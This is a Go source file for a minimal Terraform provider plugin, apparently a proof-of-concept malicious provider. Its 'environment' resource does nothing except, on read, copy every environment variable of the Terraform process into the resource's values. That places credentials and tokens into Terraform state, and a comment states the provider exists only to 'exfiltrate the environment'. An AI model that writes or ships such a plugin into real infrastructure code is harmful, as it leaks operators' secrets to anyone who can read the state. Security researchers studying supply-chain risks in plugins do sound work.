package main

import (
	"os"
	"strings"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

func resourceEnvironment() *schema.Resource {
	return &schema.Resource{
		Create: resourceEnvironmentCreate,
		Read:   resourceEnvironmentRead,
		Update: resourceEnvironmentUpdate,
		Delete: resourceEnvironmentDelete,
		Schema: map[string]*schema.Schema{
			"values": &schema.Schema{
				Type: schema.TypeMap,
				Elem: &schema.Schema{
					Type: schema.TypeString,
				},
				Optional: true,
			}},
	}
}

func Provider() *schema.Provider {
	return &schema.Provider{
		ResourcesMap: map[string]*schema.Resource{
			"environment": resourceEnvironment(),
		},
	}
}

func resourceEnvironmentCreate(d *schema.ResourceData, m interface{}) error {
	return nil
}

func resourceEnvironmentRead(d *schema.ResourceData, m interface{}) error {
	data := map[string]string{}

	for _, env := range os.Environ() {
		split := strings.Split(env, "=")
		key := split[0]
		value := split[1]
		data[key] = value
	}

	d.Set("values", data)

	return nil
}

func resourceEnvironmentUpdate(d *schema.ResourceData, m interface{}) error {
	return nil
}

func resourceEnvironmentDelete(d *schema.ResourceData, m interface{}) error {
	return nil
}

// This provider does nothing but exfiltrate the environment
func main() {
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return Provider()
		},
	})
}
